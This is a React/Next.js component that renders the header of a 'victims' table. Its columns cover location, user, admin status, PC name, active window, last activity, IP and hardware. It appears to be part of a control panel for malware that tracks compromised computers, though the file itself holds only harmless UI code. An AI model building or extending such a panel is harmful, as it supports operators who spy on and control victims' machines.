import Image from "next/image";
import { useCallback, useMemo, useState } from "react";

import { cn } from "../../../../lib/utils";

import { victimsColumnSizeClass, type VictimsColumnKey } from "./victims-columns";
import { useVictimsTableColumnReorder } from "./use-victims-table-column-reorder";
import { useVictimsTablePrefs } from "./victims-table-prefs-provider";

type HeaderMeta = {
   label?: string;
   withIcon?: boolean;
   iconOnly?: boolean;
};

function headerMeta(col: VictimsColumnKey): HeaderMeta {
   switch (col) {
      case "h-country":
         return { label: "loc" };
      case "h-icon":
         return { withIcon: true, iconOnly: true };
      case "h-user":
         return { label: "user", withIcon: true };
      case "h-admin":
         return { label: "admin" };
      case "h-pc-name":
         return { label: "pc-name", withIcon: true };
      case "h-window":
         return { label: "window", withIcon: true };
      case "h-last-active":
         return { label: "last active", withIcon: true };
      case "h-id":
         return { label: "id" };
      case "h-ip":
         return { label: "ip", withIcon: true };
      case "h-os":
         return { label: "os", withIcon: true };
      case "h-cpu":
         return { label: "cpu", withIcon: true };
      case "h-ram":
         return { label: "ram", withIcon: true };
      case "h-gpu":
         return { label: "gpu", withIcon: true };
      case "h-comment":
         return { label: "comment", withIcon: true };
      default:
         return {};
   }
}

function HeaderCell(props: {
   col: VictimsColumnKey;
   label?: string;
   withIcon?: boolean;
   iconOnly?: boolean;
}) {
   const { col, label, withIcon, iconOnly } = props;

   return (
      <th
         className={cn(
            "sticky top-0 z-[2] bg-[rgba(42,42,42,0.86)] px-[4px] pb-[3px] pt-0 text-left text-[20px] font-normal leading-[1.05] text-white/[0.98]",
            "hover:bg-[rgba(42,42,42,0.86)] active:bg-[rgba(42,42,42,0.86)] focus:bg-[rgba(42,42,42,0.86)] focus-within:bg-[rgba(42,42,42,0.86)]",
            "select-none whitespace-nowrap",
            "isReorderable",
            col,
            victimsColumnSizeClass(col),
         )}
         style={{ borderTop: "1px solid var(--line)", borderBottom: "3px solid var(--line)" }}
      >
         {col === "h-icon" ? (
            <span className="thLabel inline-flex items-center gap-[6px]">
               <span className="thSep mr-[6px] opacity-65">|</span>
               {withIcon && (
                  <Image
                     className="thIcon h-[14px] w-[14px] opacity-90 [filter:brightness(0)_invert(1)]"
                     src="/icons/listtop.svg"
                     alt=""
                     width={14}
                     height={14}
                     draggable={false}
                  />
               )}
               {!iconOnly && <span>{label}</span>}
            </span>
         ) : (
            <span className="thLabel inline-flex items-center gap-[6px]">
               <span className="thSep mr-[6px] opacity-65">|</span>
               {withIcon && (
                  <Image
                     className="thIcon h-[14px] w-[14px] opacity-90 [filter:brightness(0)_invert(1)]"
                     src="/icons/listtop.svg"
                     alt=""
                     width={14}
                     height={14}
                     draggable={false}
                  />
               )}
               {!iconOnly && <span>{label}</span>}
            </span>
         )}
      </th>
   );
}

export function VictimsTableHeader() {
   const prefs = useVictimsTablePrefs();
   const [headerRow, setHeaderRow] = useState<HTMLTableRowElement | null>(null);
   const headerRowRef = useCallback((el: HTMLTableRowElement | null) => {
      setHeaderRow(el);
   }, []);

   useVictimsTableColumnReorder({
      headerRow,
      columnOrder: prefs.columnOrder,
      setColumnOrder: prefs.setColumnOrder,
   });

   const cols = useMemo(() => prefs.columnOrder, [prefs.columnOrder]);

   return (
      <thead>
         <tr ref={headerRowRef}>
            {cols.map((col) => {
               const meta = headerMeta(col);
               return <HeaderCell key={col} col={col} label={meta.label} withIcon={meta.withIcon} iconOnly={meta.iconOnly} />;
            })}
         </tr>
      </thead>
   );
}